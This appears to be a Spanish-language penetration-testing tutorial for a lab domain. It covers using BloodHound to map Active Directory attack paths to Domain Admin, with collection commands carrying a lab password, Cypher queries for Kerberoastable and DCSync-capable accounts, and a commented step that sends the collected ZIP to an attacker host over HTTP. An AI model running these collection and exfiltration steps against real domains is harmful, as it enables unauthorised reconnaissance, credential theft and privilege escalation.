# BloodHound — Análisis gráfico de Active Directory

BloodHound es la herramienta más poderosa para entender un dominio AD.
Construye un grafo de relaciones y encuentra automáticamente el camino
más corto desde cualquier usuario hasta Domain Admin.

---

## Instalación

```bash
# En Kali
sudo apt install bloodhound neo4j -y

# Alternativa con Docker
docker run -p 7474:7474 -p 7687:7687 neo4j
```

## Puesta en marcha

```bash
# 1. Iniciar Neo4j
sudo neo4j start

# 2. Configurar contraseña (primera vez)
# Abrir http://localhost:7474
# Usuario: neo4j / Contraseña: neo4j
# Cambiar a: neo4j / bloodhound

# 3. Iniciar BloodHound
bloodhound &
# Conectar: bolt://localhost:7687 / neo4j / bloodhound
```

---

## Recolección de datos (SharpHound / BloodHound-python)

### Desde Kali con BloodHound-python

```bash
pip install bloodhound

# Recolección completa
bloodhound-python -d empresa.local -u juan.garcia -p "Password123!" \
    -ns 192.168.1.10 -c All

# Solo ACLs (mas rapido)
bloodhound-python -d empresa.local -u juan.garcia -p "Password123!" \
    -ns 192.168.1.10 -c ACL

# Output: archivos JSON en el directorio actual
ls *.json
```

### Desde Windows con SharpHound.exe

```powershell
# Descargar desde: https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe -c All --zipfilename loot.zip

# Exfiltrar el ZIP a Kali
# python3 -m http.server 8080  (en Kali)
# Invoke-WebRequest -Uri http://192.168.1.35:8080/upload -Method POST (en Windows)
```

---

## Importar datos en BloodHound

1. Abrir BloodHound en el navegador
2. Clic en el icono de subida (Upload Data)
3. Seleccionar los archivos JSON o el ZIP
4. Esperar a que se procesen

---

## Queries más útiles

### Encontrar rutas de ataque

```
Análisis → Find Shortest Paths to Domain Admins
→ Muestra el camino más corto desde cualquier usuario hasta DA

Análisis → Find Principals with DCSync Rights
→ Usuarios que pueden ejecutar DCSync sin ser DA

Análisis → Find Computers with Unconstrained Delegation
→ Equipos donde robar TGTs de administradores

Análisis → Shortest Path from Owned Principals
→ Marcar usuarios comprometidos y ver qué pueden alcanzar
```

### Marcar usuarios como "owned" (comprometidos)

```
# Clic derecho sobre el nodo → Mark as Owned
# Útil para ver qué puedes alcanzar desde los usuarios ya comprometidos

# En nuestro lab, marcar:
# → juan.garcia (acceso inicial)
# → svc-sql (tras Kerberoasting)
# → maria.lopez (tras AS-REP Roasting)
```

### Queries Cypher personalizadas

```cypher
// Todos los usuarios con SPN (Kerberoastables)
MATCH (u:User) WHERE u.hasspn=true RETURN u.name

// Grupos privilegiados y sus miembros
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"})
RETURN u.name

// Usuarios con DCSync rights
MATCH p=()-[:GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN p

// Rutas desde svc-sql hasta Domain Admins
MATCH p=shortestPath((u:User {name:"SVC-SQL@EMPRESA.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"}))
RETURN p
```

---

## Interpretar los resultados

| Color del nodo | Significado |
|---------------|-------------|
| 🟡 Amarillo | Usuario |
| 🔵 Azul | Equipo |
| 🟢 Verde | Grupo |
| 🔴 Rojo | Owned (comprometido) |

| Tipo de relación | Significado para el atacante |
|-----------------|------------------------------|
| MemberOf | Herencia de privilegios de grupo |
| AdminTo | Administrador local del equipo |
| HasSession | Sesión activa de un usuario en ese equipo |
| CanRDP | Puede conectarse por RDP |
| GenericAll | Control total sobre el objeto |
| WriteDACL | Puede modificar las ACLs del objeto |
| DCSync | Puede ejecutar DCSync |
